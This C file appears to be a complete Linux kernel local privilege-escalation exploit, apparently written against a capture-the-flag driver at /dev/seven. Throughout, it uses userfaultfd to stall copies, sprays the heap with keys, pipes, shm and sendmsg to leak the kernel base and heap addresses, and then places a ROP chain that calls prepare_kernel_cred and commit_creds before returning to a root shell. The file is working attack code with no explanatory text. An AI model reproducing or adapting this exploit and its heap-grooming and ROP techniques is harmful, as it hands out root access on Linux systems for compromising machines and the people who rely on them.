#include "banzi.h"

int moon_fd;
uint64_t heap_addr, kernel_base, shm_struct_addr, pipe_addr, pipe_free_addr, legal_page;

struct uffd_thread_args {
    uint64_t uffd;
    uint64_t src_addr;
    uint64_t dst_addr;
};

void wake_range(int ufd, unsigned long addr, unsigned long len) {
    struct uffdio_range uffdio_wake;

    uffdio_wake.start = addr;
    uffdio_wake.len = len;

    if (ioctl(ufd, UFFDIO_WAKE, &uffdio_wake)) fprintf(stderr, "error waking %lu\n", addr), exit(1);
}

static void *userfault_handler(void *arg) {
    struct uffd_msg msg; /* Data read from userfaultfd */
    int fault_cnt = 0;   /* Number of faults so far handled */
    long uffd;           /* userfaultfd file descriptor */
    char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED) perror("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {
        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1) puts("poll");

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1) puts("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */
        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            // TODO: write
            printf("[-] triggering write fault\n");
            sleep(2);
        } else {
            // TODO: read
            printf("[-] triggering read fault\n");

            sleep(2);

            fault_cnt++;
            struct uffdio_copy uffdio_copy;
            uffdio_copy.src = (uint64_t)page;
            uffdio_copy.dst = (uint64_t)msg.arg.pagefault.address & ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy)) {
                if (uffdio_copy.copy != -EEXIST) {
                    perror("ioctl");
                    exit(1);
                }
                wake_range(uffd, uffdio_copy.dst, PAGE_SIZE);
            };
        }
    }
}

static void *userfault_handler_forever(void *arg) {
    struct uffd_msg msg; /* Data read from userfaultfd */
    int fault_cnt = 0;   /* Number of faults so far handled */
    long uffd;           /* userfaultfd file descriptor */
    char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED) perror("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {
        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1) puts("poll");

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1) puts("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */
        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            // TODO: write
            printf("[-] triggering write fault\n");
            sleep(2);
        } else {
            // TODO: read
            printf("[-] triggering read fault\n");

            sleep(100000000);

            fault_cnt++;
            struct uffdio_copy uffdio_copy;
            uffdio_copy.src = (uint64_t)page;
            uffdio_copy.dst = (uint64_t)msg.arg.pagefault.address & ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy)) {
                if (uffdio_copy.copy != -EEXIST) {
                    perror("ioctl");
                    exit(1);
                }
                wake_range(uffd, uffdio_copy.dst, PAGE_SIZE);
            };
        }
    }
}

void moon_malloc() { ioctl(moon_fd, 0x5555, 0); }

void moon_free() { ioctl(moon_fd, 0x6666, 0); }
#define NUM_PIPEFDS 0x100
int pipefd[NUM_PIPEFDS][2];
static void socket_spray() {
    // for communicating with spraying in separate namespace via TX_RINGs
    pipe(sprayfd_child);
    pipe(sprayfd_parent);

    puts("setting up spray manager in separate namespace");
    if (!fork()) {
        unshare_setup(getuid(), getgid());
        spray_comm_handler();
    }

    puts("Allocated all pages");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
        send_spray_cmd(ALLOC_PAGE, i);
    }

    puts("Closed all odd pages");
    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) {
        send_spray_cmd(FREE_PAGE, i);
    }

    // TODO: get the freed odd pages back with our struct
    puts("Allocated all pipe_buf");

    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[-] pipe");
        }
        if (i % 2 == 0) {
            if (write(pipefd[i][1], "pwneeeeeeeeee", 14) < 0) {
                perror("[-] write");
            }
        }
    }

    //    puts("Allocated all shm");
    //    for (int i = 0; i < ((INITIAL_PAGE_SPRAY) / 2) * (0x1000 / 0x20) / 100; i++) {
    //        alloc_shm(i);
    //    }

    puts("Closed all even pages");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) {
        send_spray_cmd(FREE_PAGE, i);
    }
}

void pthread_sendmsg(void *msg) {
    assign_to_core(0);
    sendmsg(sendmsg_socketfd, (struct msghdr *)msg, 0);
}

// int keys[0x1000];

#define MSG_SND_N 30

int main() {
    char x;
    pthread_t threads[0x200];
    char tmp_buf[0x1000] = {0};
    assign_to_core(0);
    save_stats_64();

    moon_fd = open("/dev/seven", O_RDWR);

    sendmsg_init(MSG_SND_N, 0x1f0, 0xf00, userfault_handler);
    socket_spray();

    for (int i = 0; i < 10; i++) {
        alloc_shm(i);
    }
    // pre spray
    for (int i = 0; i < 7; i++) {
        memset(tmp_buf, 'A' + i, 0x1000);
        spray_keys[i] = alloc_key(i, tmp_buf, 0x101);
    }

    moon_malloc();
    moon_free();

    // user key limit 20000 / 0x101 = 77
    for (int i = 7; i < 77; i++) {
        memset(tmp_buf, 'a' + i, 0x1000);
        spray_keys[i] = alloc_key(i, tmp_buf, 0x101);
    }

    // getchar();

    for (int i = 0; i < 0x4; i++) {
        free_key(i);
    }
    moon_free();
    // getchar();

    for (int i = 0; i < MSG_SND_N; i++) {
        ((uint64_t *)sendmsg_msgs[i].msg_control)[0] = 0;
        ((uint64_t *)sendmsg_msgs[i].msg_control)[1] = 0;
        ((uint64_t *)sendmsg_msgs[i].msg_control)[2] = 0xfff0;
        ((uint64_t *)sendmsg_msgs[i].msg_control)[3] = 0xdeadbeef;

        pthread_create(&threads[i], NULL, pthread_sendmsg, (void *)&sendmsg_msgs[i]);
    }

    sleep(1);

    char *key_data;
    int find_key = -1;

    for (int i = 7; i < 77; i++) {
        key_data = get_key(i, 0xfff0);
        // hexdump(key_data, 0x10);
        if (((uint64_t *)key_data)[0] == 0xdeadbeef) {
            printf("1: Found key %d\n", i);
            find_key = i;
            // for (int j = 0; j < 0xfff0; j += 8) {
            //     if ((*(uint64_t *)(key_data + j) & 0xfff) == 0x5a0) {
            //         printf("2: Found file %d at %x\n", i, j);
            //         heap_addr = *(uint64_t *)(key_data + j + 0x30) - (j + 0x30 + 0x18);
            //         kernel_base = *(uint64_t *)(key_data + j) - 0x124b5a0;
            //         file_struct_addr = (heap_addr + j - 0x10);
            //         if ((kernel_base & 0xfffff) != 0) {
            //             continue;
            //         }
            //         hexdump(key_data + j - 0x28, 0x80);
            //         printf("3: Found heap addr %#lx\nkernel base %#lx\nfile_struct addr %#lx\n", heap_addr,
            //         kernel_base,
            //                (heap_addr + j - 0x10));
            //         break;
            //     }
            // }

            for (int j = 0; j < 0xfff0; j += 8) {
                if ((*(uint64_t *)(key_data + j) & 0xfff) == 0x520 && (j % 16) == 0) {
                    printf("2: Found shm %d at %x\n", i, j);
                    heap_addr = *(uint64_t *)(key_data + j - 0x18) - (j - 0x18 + 0x18);
                    kernel_base = *(uint64_t *)(key_data + j) - 0x124b520;
                    shm_struct_addr = heap_addr + j;
                    if ((kernel_base & 0xfffff) != 0) {
                        continue;
                    }
                    hexdump(key_data + j - 0x18, 0x20);
                    printf("3: Found heap addr %#lx\nkernel base %#lx\nshm_struct addr %#lx\n", heap_addr, kernel_base,
                           shm_struct_addr);
                    break;
                }
            }
            for (int j = 0; j < 0xfff0; j += 8) {
                if (*(uint64_t *)(key_data + j) == kernel_base + 0x121bbc0) {
                    pipe_addr = heap_addr + j + 0x18 - 0x10;
                    legal_page = *(uint64_t *)(key_data + j - 0x10);
                    printf("4: Found pipe %#lx, legal page %#lx\n", pipe_addr, legal_page);

                    hexdump(key_data + j - 0x10, 0x80);

                    pipe_free_addr = pipe_addr;
                    int k = 0;
                    while (*(uint64_t *)(key_data + j - 0x10 + k)) {
                        k += 0x400;
                        pipe_free_addr += 0x400;
                    }
                    printf("5: Found pipe free %#lx\n", pipe_free_addr);
                    break;
                }
            }
        }
    }

    if (!(heap_addr && kernel_base && shm_struct_addr && pipe_addr && pipe_free_addr)) {
        puts("Failed to leak addresses");
        return 0;
    }

    // since sendmsg spray chunks are not freed by now,
    // we can do something might change the fengshui.

    // prepare pollfd spray
    init_fd();

#define MSG_SND_N2 40
    // prepare sendmsg
    sendmsg_init(MSG_SND_N2, 0x1f0, 0xf00, userfault_handler_forever);

    // wait sendmsg to free automatically
    for (int i = 0; i < MSG_SND_N; i++) {
        pthread_join(threads[i], NULL);
    }
    memset(threads, 0, sizeof(threads));

    puts("Start Pollfd");
    // create pollfd and timeout with 3s
    for (int i = 0; i < 0x20; i++) {
        create_poll_thread(i, 4096 + 0x1f0, 3000); // TODO: change
    }
    sleep(1);

    for (int i = 4; i < 20; i++) {
        if (i != find_key) {
            free_key(i);
        }
    }
    free_key(find_key);

    for (int i = 0; i < MSG_SND_N2; i++) {
        ((uint64_t *)sendmsg_msgs[i].msg_control)[0] = pipe_free_addr;
        pthread_create(&threads[i], NULL, pthread_sendmsg, (void *)&sendmsg_msgs[i]);
    }

    puts("wait all pollfds freed, now pipe_free_addr should be freed");
    join_poll_threads();

    // enable the freed pipe_buf

    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (i % 2 == 1) {
            if (write(pipefd[i][1], "pwneeeeeeeeee", 14) < 0) {
                perror("[-] write");
            }
        }
    }

    uint64_t prepare_kernel_cred = kernel_base - 0xffffffff81000000 + 0xffffffff81097960;
    uint64_t commit_creds = kernel_base - 0xffffffff81000000 + 0xffffffff810976c0;
    // uint64_t work_for_cpu_fn = kernel_base - 0xffffffff81000000 + 0xffffffff81089480;

    // push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41];
    uint64_t stack_pivot_gadget_0 = kernel_base - 0xffffffff81000000 + 0xffffffff811247e6;
    // pop rsp; ret;
    // uint64_t stack_pivot_gadget_1 = kernel_base - 0xffffffff81000000 + 0xffffffff81021a7b;
    // add rsp, 0x78; ret;
    uint64_t stack_pivot_gadget_2 = kernel_base - 0xffffffff81000000 + 0xffffffff813f643e;

    // pop rsp; add rsp, 0x68; pop rbx; ret;
    uint64_t stack_pivot_gadget_1 = kernel_base - 0xffffffff81000000 + 0xffffffff8134862c;

    // pop rdi; ret;
    uint64_t pop_rdi_ret = kernel_base - 0xffffffff81000000 + 0xffffffff8153e4d6;

    // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; pop rbx; pop rbp; pop r12; ret;
    uint64_t mov_rdi_rax_gadget = kernel_base - 0xffffffff81000000 + 0xffffffff810fb3dc;

    // pop rcx; ret
    uint64_t pop_rcx_ret = kernel_base - 0xffffffff81000000 + 0xffffffff814b861c;
    uint64_t swapgs_restore_regs_and_return_to_usermode = kernel_base - 0xffffffff81000000 + 0xffffffff81e00e10 + 22;

    struct msg_struct *msg = malloc(sizeof(struct msg_struct) + 0x2000);
    msg->mtype = 1;
    // offset 0x8
    ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[0] = 0xdeadbeefcafebab1;
    ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[1] = pipe_free_addr + 0x50;
    ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[2] = 0;
    // offset 0x20
    *(uint64_t *)(msg->mtext + 0x1000 - 0x38 + 0x41) = stack_pivot_gadget_1;
    // *(uint64_t *)(msg->mtext + 0x1000 - 0x38 + 0x70) = 0xdeadbeef;
    // *(uint64_t *)(msg->mtext + 0x1000 - 0x38 + 0x78) = 0xcafebabe;

    // vtable: offset 0x50
    ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[9] = 0xdeadbeefcafebab2;
    ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[10] = stack_pivot_gadget_0;
    // ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[11] = 0xdeadbeefcafebab4;
    // ((uint64_t *)(msg->mtext + 0x1000 - 0x30))[12] = 0xdeadbeefcafebab5;

    // ROP
    int ii = 0;
    uint64_t *rop = (uint64_t *)(msg->mtext + 0x1000 - 0x38 + 0x70);

    // prepare_kenerl_cred(0)
    rop[ii++] = pop_rdi_ret;
    rop[ii++] = 0;
    rop[ii++] = prepare_kernel_cred;

    // commit_creds(*)
    rop[ii++] = pop_rcx_ret;
    rop[ii++] = 0;
    rop[ii++] = mov_rdi_rax_gadget;
    rop[ii++] = 0;
    rop[ii++] = 0;
    rop[ii++] = 0;
    rop[ii++] = commit_creds;

    // kpti ret
    rop[ii++] = swapgs_restore_regs_and_return_to_usermode;
    rop[ii++] = 0;
    rop[ii++] = 0;
    rop[ii++] = (uint64_t)&shell;
    rop[ii++] = user_cs;
    rop[ii++] = user_rflags;
    rop[ii++] = user_sp;
    rop[ii++] = user_ss;

    assert(8 * ii <= 0x280 - 0x70);

    for (int i = 0; i < 0x80; i++) {
        // prepare msg_msg
        int32_t qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        // msg_msg
        send_msg(qid, msg, 0x1000 + 0x280 - 0x38, 0);
    }
    puts("msg_msg done");

    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (close(pipefd[i][0]) < 0) {
            perror("[-] close");
        }
        if (close(pipefd[i][1]) < 0) {
            perror("[-] close");
        }
    }

    getchar();
}